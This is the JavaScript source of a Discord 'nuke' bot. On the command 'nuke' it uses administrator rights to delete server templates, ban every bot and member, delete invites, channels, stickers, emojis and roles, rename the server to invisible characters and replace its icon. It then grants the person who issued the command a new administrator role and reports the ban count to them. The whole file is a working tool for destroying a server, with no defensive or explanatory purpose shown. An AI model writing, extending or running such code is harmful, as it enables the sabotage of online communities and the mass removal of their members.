var Discord = require("discord.js");
var bot = new Discord.Client({fetchAllMembers: true,intents: 32511});
var invChar = 7356;
var token = "";
var sp = "https://cdn.discordapp.com/attachments/865721156338319401/881280861239136276/void.png";
bot.once("ready", ()=>{
    console.log("logged into "+bot.user.username);
})
/*
delete invites
ban bots
ban everyone else
delete roles
delete server backup templates
*/

async function nuke(msg) {
    var hasAdmin = msg.guild.me.permissions.toArray().includes("ADMINISTRATOR");
    if(!hasAdmin) {
        msg.author.send("I am missing permissions");
        return;
    }
    var memberCount = msg.guild.memberCount;
    var invis = String.fromCharCode(invChar).repeat(3);
    msg.guild.setVerificationLevel(0).catch(err=>console.log("set_verif_level_mp"))

    await msg.guild.fetchTemplates().then(async (templates)=>{
        await templates.forEach(async (template)=>{
            await template.delete().catch(err=>console.log("template_delete_mp"));
        })
    }).catch(err=>console.log(err));

    await msg.guild.members.fetch().then(async (members)=>{
        await members.filter(mb => mb.user.bot === true && mb.user.id != bot.user.id).forEach(async (member)=>{
            if(member.bannable) member.ban().catch(err=>console.log("bot_ban_mp"));
        });
    }).catch(err=>console.log("fetch_members_mp"));
    
    await msg.guild.members.fetch().then(async (members)=>{
        await members.forEach(async (member)=>{
            if(member.bannable) member.ban().catch(err=>console.log("member_ban_mp"));
        });
    }).catch(err=>console.log("fetch_templates_mp"));

    await msg.guild.invites.fetch().then(async (invites)=>{
        await invites.forEach(async (inv)=>{
            await inv.delete().catch(err=>console.log("invite_delete_mp"))
        })
    }).catch(err=>console.log("invite_fetch_mp"));
    
    await msg.guild.setName(invis).catch(err=>console.log("set_name_mp"));
    await msg.guild.setIcon(sp).catch(err=>console.log("set_icon_mp"));

    await msg.guild.channels.cache.forEach(async (channel)=>{

        await channel.delete().catch(err=>console.log("channel_delete_mp"));
    });

    await msg.guild.stickers.cache.forEach(async (sticker)=>{
        sticker.delete().catch(err=>console.log("sticker_delete_mp"));
    })
    await msg.guild.emojis.cache.forEach(async (emoji)=>{
        emoji.delete().catch(err=>console.log("emoji_delete_mp"));
    });
    await msg.guild.roles.cache.forEach(role=>{
        role.delete().catch(err=>{});
    });
    await msg.guild.roles.create({
        data: {
            name: invis,
            permissions: ['ADMINISTRATOR'],
            position: 1
        }
    }).then(async (role)=>{
        await msg.member.roles.add(role).catch(err=>console.log("give_role_mp"));
    }).catch(err=>console.log("give_admin_mp"));
    msg.author.send("all processes done. the bot has banned around "+(memberCount-msg.guild.memberCount)+" members.").catch(err=>console.log("caller_send_mp"));
}

bot.on("messageCreate", msg=>{
    var cmd = msg.content.toLowerCase();
    if(cmd === "nuke") {
        nuke(msg);
    }
})
bot.login(token);